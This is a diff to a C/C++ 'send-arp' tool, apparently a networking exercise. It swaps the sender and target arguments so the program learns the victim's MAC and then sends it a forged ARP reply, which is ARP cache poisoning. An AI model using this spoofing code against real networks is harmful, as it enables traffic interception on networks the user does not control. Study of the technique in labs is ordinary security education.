@@ -17,7 +17,7 @@ struct EthArpPacket {
 
 void usage() {
         printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
-        printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
+        printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -69,7 +69,7 @@ int main(int argc, char* argv[]) {
 
         s = socket(AF_INET, SOCK_DGRAM, 0);
         ifr.ifr_addr.sa_family = AF_INET;
-        strncpy(ifr.ifr_name, dev->name , sizeof(dev->name) -1);
+        strncpy(ifr.ifr_name, dev->name , sizeof(dev->name)-1);
 
         if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
             printf("Error occured during ioctl().");
@@ -98,7 +98,7 @@ int main(int argc, char* argv[]) {
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
         packet.arp_.smac_ = Mac(mac);
-        packet.arp_.tip_ = htonl(Ip(argv[3]));
+        packet.arp_.tip_ = htonl(Ip(argv[2]));
 
 
 
@@ -142,9 +142,9 @@ int main(int argc, char* argv[]) {
                 printf("ARP packet captured.\n");
                 if(rcvpkt->arp_.op_ == htons(ArpHdr::Reply)){
                     printf("ARP Reply packet captured.\n");
-                    if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(argv[3]))) {
+                    if(rcvpkt->arp_.sip_ == (Ip)htonl(Ip(argv[2]))) {
                         strncpy(mac, std::string(Mac((uint8_t*)rcvpkt->arp_.smac_)).c_str(), 17);
-                        printf("ARP Reply from target captured!\ntmac :%s\n", mac);
+                        printf("ARP Reply from target captured!\nvictim mac :%s\n", mac);
                         break;
 
                     }
@@ -161,7 +161,7 @@ int main(int argc, char* argv[]) {
 
         packet.eth_.dmac_ = Mac(mac);
         packet.arp_.op_ = htons(ArpHdr::Reply);
-        packet.arp_.sip_ = htonl(Ip(argv[2]));
+        packet.arp_.sip_ = htonl(Ip(argv[3]));
         packet.arp_.tmac_ = Mac(mac);
 
 
